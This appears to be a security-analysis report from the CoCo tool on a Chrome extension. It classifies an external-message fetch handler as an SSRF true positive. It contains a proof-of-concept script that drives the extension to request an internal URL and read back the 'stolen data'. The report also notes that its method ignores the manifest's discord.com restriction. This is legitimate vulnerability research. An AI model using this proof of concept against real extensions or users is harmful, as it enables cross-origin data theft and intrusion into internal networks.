# CoCo Analysis: pfmlgebacgjbhlbdmlpmjldhkoeohbnl

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (fetch_resource_sink, fetch_options_sink - same vulnerability)

---

## Sink: bg_external_port_onMessage → fetch_resource_sink + fetch_options_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pfmlgebacgjbhlbdmlpmjldhkoeohbnl/opgen_generated_files/bg.js
Line 1019	if(msg.type === "fetch" && msg.url) {
Line 1021	fetch(msg.url, msg.options).then(async res => {

**Code:**

```javascript
// Background script - External message handler (bg.js, lines 1016-1041)
chrome.runtime.onConnectExternal.addListener(port => {  // ← External connections allowed
    function messageHandler(msg) {  // ← Attacker-controlled message
        if(msg.type) {
            if(msg.type === "fetch" && msg.url) {  // ← Attacker-controlled URL
                log(["Request to", msg.url], "csp");
                fetch(msg.url, msg.options).then(async res => {  // ← Attacker-controlled URL and options
                    if(port.onMessage.hasListener(messageHandler)) {
                        port.postMessage({text: await res.text(), init: {  // ← Response sent back to attacker
                            status: res.status,
                            statusText: res.statusText,
                            headers: res.headers
                        }});
                    }
                }).catch(e => {
                    let error = e.toString().split(": ");
                    if(port.onMessage.hasListener(messageHandler)) {
                        port.postMessage({
                            error : {
                                type: error[0],
                                text: error[1]
                            }
                        });
                    }
                });
            }
        }
    }

    port.onMessage.addListener(messageHandler);
    port.onDisconnect.addListener(disconnectHandler);
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Message (chrome.runtime.onConnectExternal)

**Attack:**

```javascript
// From a malicious extension or whitelisted website (discord.com)
const port = chrome.runtime.connect("pfmlgebacgjbhlbdmlpmjldhkoeohbnl");

port.postMessage({
    type: "fetch",
    url: "http://internal-server/admin/secrets",  // ← SSRF to internal network
    options: {
        method: "POST",
        headers: { "Authorization": "Bearer stolen-token" },
        body: JSON.stringify({ action: "exfiltrate" })
    }
});

port.onMessage.addListener((response) => {
    console.log("Stolen data:", response.text);  // ← Attacker receives response
});
```

**Impact:** Server-Side Request Forgery (SSRF) with full response exfiltration. An attacker can make privileged cross-origin requests to any URL (including internal networks) with arbitrary HTTP methods, headers, and body, and receive the complete response back. The extension has host_permissions for "https://*/*", giving it access to make requests to any HTTPS resource. While externally_connectable restricts to discord.com domains, the methodology requires us to ignore manifest.json restrictions and treat onConnectExternal as exploitable.
